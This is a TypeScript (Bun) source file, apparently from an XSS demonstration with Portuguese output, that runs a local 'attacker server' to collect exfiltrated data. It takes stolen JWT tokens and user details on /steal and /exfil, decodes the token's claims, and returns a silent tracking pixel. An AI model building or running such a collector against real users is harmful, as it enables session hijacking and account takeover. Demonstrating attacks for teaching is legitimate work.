/**
 * Attacker server — simulates an external malicious server
 * that receives exfiltrated data from XSS attacks.
 *
 * Run: bun run attacker-server.ts
 * Port: 5000
 */

const server = Bun.serve({
  port: 5000,
  fetch(req) {
    const url = new URL(req.url);

    // CORS — accept requests from any origin
    if (req.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
          "Access-Control-Allow-Headers": "*",
        },
      });
    }

    // Capture exfiltrated data
    if (url.pathname === "/steal" || url.pathname === "/exfil" || url.pathname === "/") {
      const token = url.searchParams.get("token") || url.searchParams.get("d") || "";
      const userRaw = url.searchParams.get("user") || "";
      const timestamp = new Date().toISOString();

      let userName = "???";
      let userEmail = "???";
      try {
        const parsed = JSON.parse(decodeURIComponent(userRaw));
        userName = parsed.nome || "???";
        userEmail = parsed.email || "???";
      } catch { /* not parseable */ }

      console.log("");
      console.log("\x1b[41m\x1b[37m                                                            \x1b[0m");
      console.log("\x1b[41m\x1b[37m   DADOS RECEBIDOS NO SERVIDOR DO ATACANTE                   \x1b[0m");
      console.log("\x1b[41m\x1b[37m                                                            \x1b[0m");
      console.log("");
      console.log(`  \x1b[90mTimestamp:\x1b[0m  ${timestamp}`);
      console.log(`  \x1b[90mVitima:\x1b[0m     \x1b[33m${userName}\x1b[0m`);
      console.log(`  \x1b[90mEmail:\x1b[0m      \x1b[33m${userEmail}\x1b[0m`);
      console.log(`  \x1b[90mToken JWT:\x1b[0m  \x1b[31m${token.substring(0, 70)}${token.length > 70 ? "..." : ""}\x1b[0m`);
      if (token) {
        try {
          const payload = JSON.parse(Buffer.from(token.split(".")[1], "base64url").toString());
          console.log(`  \x1b[90mJWT sub:\x1b[0m    ${payload.sub}`);
          console.log(`  \x1b[90mJWT email:\x1b[0m  ${payload.email}`);
          console.log(`  \x1b[90mJWT role:\x1b[0m   \x1b[31m${payload.role}\x1b[0m`);
        } catch { /* invalid jwt */ }
      }
      console.log("");
      console.log("  \x1b[31mO atacante agora pode usar este token para acessar a\x1b[0m");
      console.log("  \x1b[31mconta da vitima sem precisar de login ou senha.\x1b[0m");
      console.log("");

      // Return 1x1 transparent pixel (silent for the victim)
      return new Response(
        Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"),
        {
          headers: {
            "Content-Type": "image/gif",
            "Access-Control-Allow-Origin": "*",
          },
        }
      );
    }

    return new Response("Attacker server running", { status: 200 });
  },
});

console.log("");
console.log("\x1b[31m  ╔════════════════════════════════════════════╗\x1b[0m");
console.log("\x1b[31m  ║   SERVIDOR DO ATACANTE                    ║\x1b[0m");
console.log("\x1b[31m  ║   http://localhost:5000                   ║\x1b[0m");
console.log("\x1b[31m  ║                                           ║\x1b[0m");
console.log("\x1b[31m  ║   Aguardando dados exfiltrados...         ║\x1b[0m");
console.log("\x1b[31m  ╚════════════════════════════════════════════╝\x1b[0m");
console.log("");
